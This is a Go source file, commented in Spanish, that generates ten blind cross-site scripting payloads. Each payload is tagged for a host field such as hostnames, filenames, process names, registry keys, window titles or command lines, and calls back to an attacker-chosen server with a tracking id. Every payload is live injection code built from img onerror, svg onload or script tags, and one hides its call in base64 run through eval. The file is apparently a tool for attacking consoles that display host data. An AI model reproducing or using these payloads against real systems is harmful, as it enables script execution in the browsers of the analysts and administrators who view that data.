package xss

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
)

// XSSPayload representa un payload XSS con su metadata
type XSSPayload struct {
	ID          string `json:"id"`
	Type        string `json:"type"`
	Content     string `json:"content"`
	Vector      string `json:"vector"`
	CallbackURL string `json:"callback_url"`
}

// XSSPayloadMetadata es la metadata que se envía al servidor
type XSSPayloadMetadata struct {
	ID     string `json:"id"`
	Type   string `json:"type"`
	Vector string `json:"vector"`
}

// GeneratePayloadID genera un ID único para tracking
func GeneratePayloadID() string {
	bytes := make([]byte, 8)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// GetAllPayloads retorna todos los payloads XSS embebidos
func GetAllPayloads(callbackServer string) []XSSPayload {
	payloads := []XSSPayload{}

	// === PAYLOADS PARA HOSTNAME ===
	
	// Payload 1: IMG tag con onerror
	id1 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id1,
		Type:        "img-onerror",
		Vector:      "hostname",
		CallbackURL: callbackServer,
		Content:     fmt.Sprintf(`PC-<img src=x onerror="fetch('%s/xss-callback?id=%s&v=hostname')">`, callbackServer, id1),
	})

	// Payload 2: Script tag directo
	id2 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id2,
		Type:        "script-direct",
		Vector:      "hostname",
		CallbackURL: callbackServer,
		Content:     fmt.Sprintf(`<script>fetch('%s/xss-callback?id=%s&v=hostname')</script>`, callbackServer, id2),
	})

	// Payload 3: SVG con onload
	id3 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id3,
		Type:        "svg-onload",
		Vector:      "hostname",
		CallbackURL: callbackServer,
		Content:     fmt.Sprintf(`HOST<svg onload=fetch('%s/xss-callback?id=%s&v=hostname')>`, callbackServer, id3),
	})

	// === PAYLOADS PARA FILENAMES ===
	
	// Payload 4: Filename con IMG
	id4 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id4,
		Type:        "img-filename",
		Vector:      "filename",
		CallbackURL: callbackServer,
		Content:     fmt.Sprintf(`malware<img src=x onerror=fetch('%s/xss-callback?id=%s&v=filename')>.txt`, callbackServer, id4),
	})

	// Payload 5: Filename con SVG
	id5 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id5,
		Type:        "svg-filename",
		Vector:      "filename",
		CallbackURL: callbackServer,
		Content:     fmt.Sprintf(`document<svg onload=fetch('%s/xss-callback?id=%s&v=filename')>.txt`, callbackServer, id5),
	})

	// === PAYLOADS PARA PROCESS NAMES ===
	
	// Payload 6: Process con IMG
	id6 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id6,
		Type:        "img-process",
		Vector:      "process",
		CallbackURL: callbackServer,
		Content:     fmt.Sprintf(`<img src=x onerror=fetch('%s/xss-callback?id=%s&v=process')>`, callbackServer, id6),
	})

	// === PAYLOADS PARA REGISTRY KEYS ===
	
	// Payload 7: Registry con IMG
	id7 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id7,
		Type:        "img-registry",
		Vector:      "registry",
		CallbackURL: callbackServer,
		Content:     fmt.Sprintf(`XSSTest<img src=x onerror=fetch('%s/xss-callback?id=%s&v=registry')>`, callbackServer, id7),
	})

	// === PAYLOADS OFUSCADOS ===
	
	// Payload 8: Base64 ofuscado
	id8 := GeneratePayloadID()
	b64Payload := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("fetch('%s/xss-callback?id=%s&v=obfuscated')", callbackServer, id8)))
	payloads = append(payloads, XSSPayload{
		ID:          id8,
		Type:        "obfuscated-base64",
		Vector:      "hostname",
		CallbackURL: callbackServer,
		Content:     fmt.Sprintf(`<img src=x onerror="eval(atob('%s'))">`, b64Payload),
	})

	// === PAYLOADS PARA WINDOW TITLES ===
	
	// Payload 9: Window title con script
	id9 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id9,
		Type:        "script-window",
		Vector:      "window",
		CallbackURL: callbackServer,
		Content:     fmt.Sprintf(`<script>fetch('%s/xss-callback?id=%s&v=window')</script>`, callbackServer, id9),
	})

	// === PAYLOADS PARA COMMAND LINE ===
	
	// Payload 10: Command line con IMG
	id10 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id10,
		Type:        "img-cmdline",
		Vector:      "cmdline",
		CallbackURL: callbackServer,
		Content:     fmt.Sprintf(`/c echo <img src=x onerror=fetch('%s/xss-callback?id=%s&v=cmdline')>`, callbackServer, id10),
	})

	return payloads
}

// GetPayloadMetadata extrae solo la metadata de los payloads (para enviar al servidor)
func GetPayloadMetadata(payloads []XSSPayload) []XSSPayloadMetadata {
	metadata := make([]XSSPayloadMetadata, len(payloads))
	for i, p := range payloads {
		metadata[i] = XSSPayloadMetadata{
			ID:     p.ID,
			Type:   p.Type,
			Vector: p.Vector,
		}
	}
	return metadata
}
